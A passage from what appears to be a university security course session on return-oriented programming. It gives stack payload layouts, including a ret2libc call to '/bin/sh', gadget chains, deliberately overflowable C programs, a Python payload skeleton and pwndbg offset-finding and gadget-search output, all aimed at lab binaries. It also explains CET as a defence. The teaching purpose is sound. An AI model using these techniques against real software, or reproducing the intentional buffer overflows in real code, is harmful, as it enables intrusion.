RET + 0x08:   address to desired command (e.g. &#39;/bin/sh&#39;)
</code></pre><p>However, what happens when you need to call multiple functions? Say you need
to call <code>f1()</code> and then <code>f2(0xAB, 0xCD)</code>? The payload should be:</p><pre tabindex=0><code>RET + 0x00:   addr of f1
RET + 0x04:   addr of f2 (return address after f1 finishes)
RET + 0x08:   JUNK (return address after f2 finishes: we don&#39;t care about what happens after the 2 functions are called)
RET + 0x0c:   0xAB (param1 of f2)
RET + 0x10:   0xCD (param2 of f2)
</code></pre><p>What about if we need to call <code>f1(0xAB, 0xCD)</code> and then <code>f2(0xEF, 0x42)</code>?</p><pre tabindex=0><code>RET + 0x00:   addr of f1
RET + 0x04:   addr of f2 (return address after f1 finishes)
RET + 0x08:   0xAB (param1 of f1)
RET + 0x0c:   0xCD (param2 of f1) but this should also be 0xEF (param1 of f2)
RET + 0x10:   0x42 (param2 of f2)
</code></pre><h3 id=nop-analogy>NOP Analogy</h3><p>While <code>ret2libc</code> uses functions directly, ROP uses a finer level of code
execution: instruction groups. Let&rsquo;s explore an example:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#204a87;font-weight:700>int</span> <span style=color:#000>main</span><span style=color:#000;font-weight:700>(</span><span style=color:#204a87;font-weight:700>void</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>char</span> <span style=color:#000>a</span><span style=color:#000;font-weight:700>[</span><span style=color:#0000cf;font-weight:700>16</span><span style=color:#000;font-weight:700>];</span>
</span></span><span style=display:flex><span>	<span style=color:#000>read</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>a</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>100</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>return</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>}</span>
</span></span></code></pre></div><p>This code obviously suffers from a stack buffer overflow. The offset to the
return address is 24. So <code>DOWRD</code>s from offset 24 onwards will be popped from the
stack and executed. Remember the <code>NOP</code> sled concept from previous sessions?
These were long chains of <code>NOP</code> instructions (<code>\x90</code>) used to pad a payload for
alignment purposes. Since we can&rsquo;t add any new code to the program (<em>NX</em> is
enabled) how could we simulate the effect of a <code>NOP</code> sled? Easy! Using return
instructions!</p><p>Let&rsquo;s find the <code>ret</code> instructions in a would-be binary:</p><pre tabindex=0><code>$ objdump  -d hello -M intel | grep $&#39;\t&#39;ret
 80482dd:	c3                   	ret   
 804837a:	c3                   	ret   
 80483b7:	c3                   	ret   
 8048437:	c3                   	ret   
 8048444:	c3                   	ret   
 80484a9:	c3                   	ret   
 80484ad:	c3                   	ret   
 80484c6:	c3                   	ret
</code></pre><p>Any and all of these addresses will be ok. The payload could be the following:</p><pre tabindex=0><code>RET + 0x00:   0x80482dd
RET + 0x04:   0x80482dd
RET + 0x08:   0x80482dd
RET + 0x0c:   0x80482dd
RET + 0x10:   0x80482dd
[...]
</code></pre><p>The above payload will run like so: the original <code>ret</code> (in the normal code flow)
will pop <code>RET+0x00</code> off the stack and jump to it. When <code>RET+0x00</code> gets popped,
the stack is automatically increased by 4 (on to the next value). The
instruction at <code>0x80482dd</code> is another <code>ret</code>, which does the same thing as before.
This goes on until another address that is not a <code>ret</code> is popped off the stack.</p><p>In general, you can use the skeleton below to generate payloads:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#! /usr/bin/python3</span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>import</span> <span style=color:#000>struct</span><span style=color:#ce5c00;font-weight:700>,</span> <span style=color:#000>sys</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>def</span> <span style=color:#000>dw</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>i</span><span style=color:#000;font-weight:700>):</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>return</span> <span style=color:#000>struct</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>pack</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;&lt;I&#34;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>i</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#TODO update count for your prog</span>
</span></span><span style=display:flex><span><span style=color:#000>pad_count_to_ret</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#0000cf;font-weight:700>1</span>
</span></span><span style=display:flex><span><span style=color:#000>payload</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>b</span><span style=color:#4e9a06>&#34;X&#34;</span> <span style=color:#ce5c00;font-weight:700>*</span> <span style=color:#000>pad_count_to_ret</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#TODO figure out the rop chain</span>
</span></span><span style=display:flex><span><span style=color:#000>payload</span> <span style=color:#ce5c00;font-weight:700>+=</span> <span style=color:#000>dw</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>0xcafebeef</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#000>payload</span> <span style=color:#ce5c00;font-weight:700>+=</span> <span style=color:#000>dw</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>0xdeadc0de</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>sys</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>stdout</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>write</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>payload</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>decode</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;ascii&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>&#39;replace&#39;</span><span style=color:#000;font-weight:700>))</span>
</span></span></code></pre></div><h2 id=gadgets-and-rop-chains>Gadgets and ROP Chains</h2><h3 id=code-execution>Code Execution</h3><p>Now that we&rsquo;ve understood the basics of Return Oriented Programming, let&rsquo;s
actually do something useful. The building blocks of ROP payloads are called
<strong>gadgets</strong>. These are blocks of instructions that end with a <code>ret</code> instruction.
Here are some <em>gadgets</em> from the previous program:</p><pre tabindex=0><code>0x8048443: pop ebp; ret
0x80484a7: pop edi; pop ebp; ret
0x8048441: mov ebp,esp; pop ebp; ret
0x80482da: pop eax; pop ebx; leave; ret
0x80484c3: pop ecx; pop ebx; leave; ret
</code></pre><p>By carefully placing addresses to such gadgets on the stack we can bring code
execution to almost any context we want. As an example, let&rsquo;s say we would like
to load <code>0x41424344</code> into <code>eax</code> and <code>0x61626364</code> into <code>ebx</code>. The payload should
look like this:</p><pre tabindex=0><code>RET + 0x00:   0x80482da  (pop eax; pop ebx; leave; ret)
RET + 0x04:   0x41424344
RET + 0x08:   0x61626364
RET + 0x0c:   0xAABBCCDD (instruction were the gadget&#39;s ret will jump to)
</code></pre><p>Let&rsquo;s see what exactly happens when this payload is given to our binary:</p><ul><li>First the ret addr is popped from the stack and execution goes there.</li><li>At <code>pop eax</code>, <code>0x41424344</code> is loaded into <code>eax</code> and the stack is increased.</li><li>At <code>pop ebx</code>, <code>0x61626364</code> is loaded into <code>ebx</code> and the stack is increased
again.</li><li>At <code>leave</code>, two things actually happen: <code>mov esp, ebp; pop ebp</code>. So the stack
frame is decreased to the previous one (pointed by <code>ebp</code>) and <code>ebp</code> is updated
to the one before that. So <code>esp</code> will now be the old <code>ebp + 4</code>.</li><li>At <code>ret</code>, the code flow will go to the instruction pointed to by <code>ebp+4</code>. This
implies that execution will not go to <code>0xAABBCCDD</code> but to some other address
that may or may not be in our control (depending on how much we can overflow on
the stack). If it is in our control we can overwrite that address with the rest
of the ROP chain.</li></ul><h3 id=changing-register-values>Changing Register Values</h3><p>We have now seen how gadgets can be useful if we want the CPU to achieve a
certain state. This is particularly useful on other architectures such as ARM
and x86_64 where functions do not take parameters from the stack but from
registers. As an example, if we want to call <code>f1(0xAB, 0xCD, 0xEF)</code> on x86_64 we
first need to know the calling convention for the first three parameters (the
convention for placing the rest of the parameters can be found in
<a href=https://en.wikipedia.org/wiki/X86_calling_conventions#x86-64_calling_conventions>table here</a>):</p><pre tabindex=0><code>1st param: RDI
2nd param: RSI
3rd param: RDX
</code></pre><p>Now we need to find gadgets for each of these parameters. Let&rsquo;s assume these 2
scenarios: Scenario 1:</p><pre tabindex=0><code>0x400124:  pop rdi; pop rsi; ret
0x400235:  pop rdx; ret
0x400440:  f1()

Payload:
RET + 0x00:   0x400124
RET + 0x08:   val of RDI (0xAB)
RET + 0x10:   val of RSI (0xCD)
RET + 0x18:   0x400235
RET + 0x20:   val of RDX
RET + 0x28:   f1
</code></pre><p>Scenario 2:</p><pre tabindex=0><code>0x400125:  pop rdi; ret
0x400252:  pop rsi; ret
0x400235:  pop rdx; ret
0x400440:  f1()

Payload:
RET + 0x00:   0x400125
RET + 0x08:   val of RDI (0xAB)
RET + 0x10:   0x400252
RET + 0x18:   val of RSI (0xCD)
RET + 0x20:   0x400235 
RET + 0x28:   val of RDX
RET + 0x30:   f1
</code></pre><p>Notice that because the architecture is 64 bits wide, the values on the stack
are not dwords but qwords (quad words: 8 bytes wide). Thus, the offsets between
the values in the payload are 8, instead of 4 (as they would be on a 32-bit
architecture).</p><h3 id=clearing-the-stack>Clearing the Stack</h3><p>The second use of gadgets is to clear the stack. Remember the issue we had in
the <a href=#motivation>Motivation</a> section? Let&rsquo;s solve it using gadgets. We need to call
<code>f1(0xAB, 0xCD)</code> and then <code>f2(0xEF, 0x42)</code>. Our initial solution was:</p><pre tabindex=0><code>RET + 0x00:   addr of f1
RET + 0x04:   addr of f2 (return address after f1 finishes)
RET + 0x08:   0xAB (param1 of f1)  
RET + 0x0c:   0xCD (param2 of f1)  but this should also be 0xEF (param1 of f2)
RET + 0x10:   0x42 (param2 of f2) 
</code></pre><p>Note that now, for the sake of clarity, we&rsquo;re moving back to <code>x32</code>, so that
parameters are again passed on the stack.</p><p>The problem is that those parameters of <code>f1</code> are getting in the way of calling
<code>f2</code>. We need to find a <code>pop pop ret</code> gadget. The actual registers are not
important, as we only need to clear 2 values from the stack.</p><pre tabindex=0><code>RET + 0x00:   addr of f1
RET + 0x04:   addr of (pop eax, pop ebx, ret) 
RET + 0x08:   0xAB (param1 of f1)  
RET + 0x0c:   0xCD (param2 of f1)
RET + 0x10:   addr of f2
RET + 0x14:   JUNK
RET + 0x18:   0xEF (param1 of f2)
RET + 0x1c:   0x42 (param2 of f2) 
</code></pre><p>Now we can even call the next function <code>f3</code> if we repeat the trick:</p><pre tabindex=0><code>RET + 0x00:   addr of f1
RET + 0x04:   addr of (pop eax, pop ebx, ret) 
RET + 0x08:   0xAB (param1 of f1)  
RET + 0x0c:   0xCD (param2 of f1)
RET + 0x10:   addr of f2
RET + 0x14:   addr of (pop eax, pop ebx, ret) 
RET + 0x18:   0xEF (param1 of f2)
RET + 0x1c:   0x42 (param2 of f2) 
RET + 0x20:   addr of f3
</code></pre><h2 id=some-useful-tricks>Some Useful Tricks</h2><h3 id=memory-spraying>Memory Spraying</h3><p>Let&rsquo;s take the following program:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#204a87;font-weight:700>int</span> <span style=color:#000>main</span><span style=color:#000;font-weight:700>()</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>        <span style=color:#204a87;font-weight:700>int</span> <span style=color:#000>x</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>y</span> <span style=color:#000;font-weight:700>,</span><span style=color:#000>z</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>        <span style=color:#204a87;font-weight:700>char</span> <span style=color:#000>a</span><span style=color:#000;font-weight:700>,</span><span style=color:#000>b</span><span style=color:#000;font-weight:700>,</span><span style=color:#000>c</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>        <span style=color:#204a87;font-weight:700>char</span> <span style=color:#000>buf</span><span style=color:#000;font-weight:700>[</span><span style=color:#0000cf;font-weight:700>23</span><span style=color:#000;font-weight:700>];</span>
</span></span><span style=display:flex><span>        <span style=color:#000>read</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>buf</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>100</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>        <span style=color:#204a87;font-weight:700>return</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>}</span>
</span></span></code></pre></div><p>It&rsquo;s a fairly simple overflow, but just how fast can you figure out the offset
to the return address? How much padding do you need? There is a shortcut that
you can use to figure this out in under 30 seconds without looking at the
<em>Assembly</em> code.</p><p>A <a href=https://en.wikipedia.org/wiki/De_Bruijn_sequence>De Bruijn sequence</a> is a
string of symbols out of a given alphabet in which each consecutive K symbols
only appear once in the whole string. If we can construct such a string out of
printable characters then we only need to know the Segmentation Fault address.
Converting it back to 4 bytes and searching for it in the initial string will
give us the exact offset to the return address.</p><p><a href>pwndbg</a> can help you do this, using the
<a href=https://docs.pwntools.com/en/stable/util/cyclic.html>cyclic</a> package from the
<code>pwnlib</code> library:</p><pre tabindex=0><code>pwndbg&gt; cyclic 100  # create a 100-character long De Bruijn sequence
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

pwndbg&gt; cyclic -l aaa  # as addresses are 4 or 8  bytes long, you cannot search for a shorter pattern
[CRITICAL] Subpattern must be 4 bytes

pwndbg&gt; cyclic -l faaa  # the offset of faaa in the above cyclic pattern is 20
20
</code></pre><pre tabindex=0><code>pwndbg&gt; cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg&gt; run
Starting program: /media/teo/2TB/Chestii/Poli/SSS/Exploit/sss-exploit/sessions/return-oriented-programming/hello 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
0x080491d1 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────
 EAX  0x0
 EBX  0x0
 ECX  0x61616172 (&#39;raaa&#39;)
 EDX  0xfbad2288
 EDI  0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 ESI  0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 EBP  0x61616173 (&#39;saaa&#39;)
 ESP  0x61616178 (&#39;uaaa&#39;)
 EIP  0x61616174 (&#39;taaa&#39;)    
──────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────
Invalid address 0x61616174
[...]
pwndbg&gt; cyclic -l 0x61616174
76
</code></pre><p>From the above commands we can deduce that EIP&rsquo;s offset relative to the start of
the buffer is 76, as the address that EIP points to is <code>0x61616174</code>, i.e.
<code>'taaa'</code>, which lies at offset 76 in the cyclic pattern we&rsquo;ve just generated.</p><h3 id=checksec-in-pwndbg>checksec in pwndbg</h3><pre tabindex=0><code>pwndbg&gt; checksec
[*] &#39;/media/teo/2TB/Chestii/Poli/SSS/Exploit/sss-exploit/sessions/return-oriented-programming/hello&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre><h3 id=finding-gadgets-in-pwndbg>Finding Gadgets in <code>pwndbg</code></h3><pre tabindex=0><code>pwndbg&gt; rop
Gadgets information
============================================================
0x080490fa : adc al, 0x68 ; sbb al, 0xc0 ; add al, 8 ; call eax
0x08049146 : adc byte ptr [eax + 0x68], dl ; sbb al, 0xc0 ; add al, 8 ; call edx
0x08049104 : adc cl, cl ; ret
0x0804909b : adc dword ptr [eax - 0x2e], -1 ; call dword ptr [eax - 0x73]
0x0804917c : add al, 8 ; add ecx, ecx ; ret
0x080490fe : add al, 8 ; call eax
0x0804914b : add al, 8 ; call edx
0x0804918c : add byte ptr [eax], al ; add byte ptr [eax], al ; endbr32 ; jmp 0x8049120
[...]

Unique gadgets found: 121

pwndbg&gt; rop --grep &#34;pop .* ; pop .* ; ret&#34;  # you can perform a finer search using the --grep parameter and regular expressions
0x0804923d : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804923c : jecxz 0x80491c1 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x0804923b : jne 0x8049220 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804923e : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x0804923f : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
0x08049240 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08049242 : pop edi ; pop ebp ; ret
0x08049241 : pop esi ; pop edi ; pop ebp ; ret
</code></pre><h2 id=further-reading>Further Reading</h2><h3 id=rop-gadgets-in-pwntools>ROP Gadgets in <code>pwntools</code></h3><p><code>pwntools</code> has a rather advanced
<a href=https://docs.pwntools.com/en/stable/rop/rop.html>ROP module</a> that is capable
of crafting ROP attacks corresponding to various functions by creating
concatenating chains of ROP adresses, also known as ROP chains.</p><p>For this session, you won&rsquo;t need to use this module, but it may come in handy in
the future.</p><h3 id=linux-x86-program-start-up>Linux x86 Program Start Up</h3><p>Notice that the <code>__libc_start_main</code> will always be present in the relocation
table. As you discovered in the session dedicated to
<a href=https://github.com/hexcellents/sss-binary/tree/master/sessions/executable-file-formats>executable file formats</a>,
this is the function called by the code from the <code>_start</code> label, which, in turn,
calls the <code>main()</code> function.</p><p>To find more details about the startup of a Linux x86 program, you can read
about it
<a href=http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html>here</a>.</p><h3 id=the-pltsec-schema>The <code>.plt.sec</code> Schema</h3><p>Let&rsquo;s go back to the small piece of code at the beginning of this lecture:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#include</span> <span style=color:#8f5902;font-style:italic>&lt;stdio.h&gt;</span><span style=color:#8f5902;font-style:italic>
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>int</span> <span style=color:#000>main</span><span style=color:#000;font-weight:700>(</span><span style=color:#204a87;font-weight:700>void</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>	<span style=color:#000>puts</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;Hello world!&#34;</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>return</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>}</span>
</span></span></code></pre></div><p>If we compile it with a more modern (later than 2019) version of even the most
&ldquo;old-school&rdquo; compilers, such as <code>gcc</code>, we will notice a slight (but actually
important) difference in the <code>.plt</code> schema used by the resulting binary file.</p><pre tabindex=0><code>$ gcc -m32 -fno-PIC -no-pie hello.c -o hello
$ objdump -M intel -d hello
[...]
Disassembly of section .plt:

08049030 &lt;.plt&gt;:
 8049030:       ff 35 04 c0 04 08       push   DWORD PTR ds:0x804c004
 8049036:       ff 25 08 c0 04 08       jmp    DWORD PTR ds:0x804c008
 804903c:       0f 1f 40 00             nop    DWORD PTR [eax+0x0]
 8049040:       f3 0f 1e fb             endbr32 
 8049044:       68 00 00 00 00          push   0x0
 8049049:       e9 e2 ff ff ff          jmp    8049030 &lt;.plt&gt;
 804904e:       66 90                   xchg   ax,ax
 8049050:       f3 0f 1e fb             endbr32 
 8049054:       68 08 00 00 00          push   0x8
 8049059:       e9 d2 ff ff ff          jmp    8049030 &lt;.plt&gt;
 804905e:       66 90                   xchg   ax,ax

Disassembly of section .plt.sec:

08049060 &lt;puts@plt&gt;:
 8049060:       f3 0f 1e fb             endbr32 
 8049064:       ff 25 0c c0 04 08       jmp    DWORD PTR ds:0x804c00c
 804906a:       66 0f 1f 44 00 00       nop    WORD PTR [eax+eax*1+0x0]
[...]
</code></pre><p>Now it seems there are two <code>.plt</code> sections: the &ldquo;classic&rdquo; <code>.plt</code> and a new
<code>.plt.sec</code> section. Moreover, the entries in the <code>.plt.sec</code> section are very
similar to those we&rsquo;ve previously shown as being part of <code>.plt</code>. So why 2
<code>.plt</code>&rsquo;s? And if the initial <code>.plt</code> entries have been moved over to <code>.plt.sec</code>,
what is the purpose of the <code>.plt</code> section now?</p><p>First, let&rsquo;s check the call to <code>puts()</code> itself:</p><pre tabindex=0><code>$ objdump -D -j .text -M intel hello | grep puts
 80491b3:	e8 a8 fe ff ff       	call   8049060 &lt;puts@plt&gt;
</code></pre><p>So we see that the function being called now resides in the <code>.plt.sec</code> section.
What about the offset that <code>.plt.sec</code> redirect jumps to (i.e. <code>0x804c00c</code>)?</p><pre tabindex=0><code>$ objdump -s -M intel -j .got.plt --start-address=0x0804c00c hello

hello:     file format elf32-i386

Contents of section .got.plt:
 804c00c 40900408 50900408                    @...P...
</code></pre><p>Similarly to what we did previously, we now see that <code>0x804c00c</code> points to
address <code>0x08049040</code>, which is this code inside the <code>.plt</code> section:</p><pre tabindex=0><code>8049040:       f3 0f 1e fb             endbr32 
8049044:       68 00 00 00 00          push   0x0
8049049:       e9 e2 ff ff ff          jmp    8049030 &lt;.plt&gt;
804904e:       66 90                   xchg   ax,ax
</code></pre><p>So with the <code>.plt.sec</code> schema, there are 2 redirects: one from <code>.plt.sec</code> to
<code>.got</code> (or <code>.got.plt</code> to be more precise) and another from <code>.got.plt</code> to <code>.plt</code>.
Notice in the <code>.plt</code> stub above that, like before, <code>0x0</code> is pushed onto the
stack before the resolver is called, so that the dynamic linker can change it to
the actual address of <code>puts()</code> from libc.</p><p>So why use <code>.plt.sec</code> at all if in the end it looks like it does the same thing?
Well, <code>.plt.sec</code> is an x86-only security enhancement of the <code>.plt</code> section
(hence the <code>.sec</code> part of the name, duh&mldr;), that is used only when a security
enhancement feature called <strong>CET (Control-flow Enforcement Technology)</strong> is
enabled. In this comment, I&rsquo;ll explain what the feature is and why we have two
PLT sections if CET is enabled.</p><p>So, what does CET do? CET introduces a new restriction to indirect jump
instructions. In order to understand how CET works, let&rsquo;s assume that it is
enabled. Then, if you execute an indirect jump instruction, the processor
verifies that a special &ldquo;landing pad&rdquo; instruction, which is actually a
repurposed <code>NOP</code> instruction (now called <code>endbr32</code> or <code>endbr64</code>, as you can see
in the above snippets), is at the jump target. If the jump target does not start
with that instruction, the processor raises an exception instead of continuing
to execute code.</p><p>If CET is enabled, the compiler places <code>endbr</code> instructions to all locations
where indirect jumps may lead. This mechanism makes it extremely hard to
transfer the control to a middle of a function that is not supporsed to be a
indirect jump target, preventing certain types of attacks, such as ROP or JOP
(jump-oriented programming; very similar to ROP).</p><p>Now, let&rsquo;s explain why we have this extra PLT section for when CET is enabled.
Since you can indirectly jump to a PLT entry, we have to make PLT entries start
with an <code>endbr</code> instruction. The problem is there was no extra space for <code>endbr</code>
(which is 4 bytes long) in the old <code>.plt</code> entry schema, as the PLT entry is only
16 bytes long and all of them are already used.</p><p>In order to deal with the issue, each PLT entry was splt into two separate
entries. Remember that each PLT entry contains code to jump to an address read
from <code>.got.plt</code> <strong>AND</strong> code to resolve a dynamic symbol lazily. With the 2-PLT
schema, the former code is written to <code>.plt.sec</code>, and the latter code is written
to <code>.plt</code>, as demonstrated above.</p><h4 id=more-about-cet-and-endbr>More about CET and <code>endbr</code></h4><ul><li>A more in-depth look at the inner workings of CET and the concept of the
<strong>Shadow Stack</strong> that it uses, can be found
<a href=https://software.intel.com/content/www/us/en/develop/articles/technical-look-control-flow-enforcement-technology.html>here</a>
and
<a href=https://software.intel.com/content/www/us/en/develop/articles/technical-look-control-flow-enforcement-technology.html>here</a></li><li>The way <code>endbr</code> instructions interact with the CPU is explained
<a href=https://cdrdv2.intel.com/v1/dl/getContent/631121>here</a>, at page 38</li></ul><h4 id=tldr>TLDR</h4><p>Lazy symbol resolution in the 2-PLT schema works in the usual way, except
that the regular <code>.plt</code> is now called <code>.plt.sec</code> and <code>.plt</code> is repurposed to
contain only code for lazy symbol resolution.</p><h2 id=putting-it-all-together-demo>Putting it all Together: Demo</h2><p>Now that we&rsquo;ve learned the theoretical aspects of what Return Oriented
Programming is, let&rsquo;s put everything in practice as part of a demo.</p><p>Navigate to the folder <a href=activities/00-demo>00-demo</a>. Notice that it contains
two executables, one compiled for 32 bits (<code>vuln</code>) and the other for 64 bits
(<code>vuln64</code>). TODO: diff</p><p>Looking at their source code (it&rsquo;s one and the same for both of them), we can
easily identify their vulnerability: the <code>reader</code> function reads (duh&mldr;) 128
bytes from <code>stdin</code> into a buffer whose capacity is only 64 bytes. So we&rsquo;ll be
able to overflow this buffer. We aim to do this in order to showcase the concept
of <strong>code reuse</strong>.</p><h3 id=calling-a-function>Calling a Function</h3><p>The most basic type of code reuse is calling a function. For this, we&rsquo;ll be
calling the <code>warcraft</code> function in the <code>vuln</code> and <code>vuln64</code> binaries mentioned
above. In order to do this, we&rsquo;ll need to know:</p><ol><li>the offset of the return address inside our buffer</li><li>the address of the <code>warcraft</code> function inside the binary.</li></ol><p>For all our exploits we&rsquo;ll be using the <code>exploit.py</code> script, which is also
available in the <a href=activities/00-demo>00-demo</a> folder. Notice that <code>pwntools</code>
provides a functionality similar to <code>nm</code>, by which we can obtain the addresses
of various sybols in the binary (as long as it hasn&rsquo;t been stripped):</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#000>e</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>ELF</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>filename</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#000>warcraft_address</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>e</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>symbols</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>b</span><span style=color:#4e9a06>&#34;warcraft&#34;</span><span style=color:#000;font-weight:700>]</span>
</span></span></code></pre></div><p>As of now, requirement #2 mentioned above is complete. In order to also complete
the first requirement, we&rsquo;ll use <code>objdump</code> and check the <code>reader</code> function:</p><pre tabindex=0><code>$ objdump -M intel -d vuln
08048529 &lt;reader&gt;:
 8048529:       55                      push   ebp
 804852a:       89 e5                   mov    ebp,esp
 804852c:       83 ec 40                sub    esp,0x40
 [...]
 804853c:       a1 40 a0 04 08          mov    eax,ds:0x804a040
 8048541:       50                      push   eax
 8048542:       68 80 00 00 00          push   0x80
 8048547:       8d 45 c0                lea    eax,[ebp-0x40]
 804854a:       50                      push   eax
 804854b:       e8 10 fe ff ff          call   8048360 &lt;fgets@plt&gt;
</code></pre><p>Our vulnerable buffer is the first parameter of <code>fgets</code>, which is at offset
<code>ebp - 0x40</code> i.e. <code>ebp - 64</code>. Which means that the offset of the return address
is <code>64 + 4 = 68</code> bytes into this buffer (remember how a stack frame looks like).</p><p>So, in order to call the <code>warcraft</code> function, we&rsquo;ll give our binary a payload
made up of a padding of 68 bytes, followed by the address of <code>warcraft</code>, written
in <em>little endian</em> representation, which can be written like this:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#000>offset</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#0000cf;font-weight:700>0x40</span> <span style=color:#ce5c00;font-weight:700>+</span> <span style=color:#0000cf;font-weight:700>4</span>
</span></span><span style=display:flex><span><span style=color:#000>payload</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>offset</span> <span style=color:#ce5c00;font-weight:700>*</span> <span style=color:#4e9a06>b</span><span style=color:#4e9a06>&#34;A&#34;</span> <span style=color:#ce5c00;font-weight:700>+</span> <span style=color:#000>pack</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>warcraft_address</span><span style=color:#000;font-weight:700>)</span>
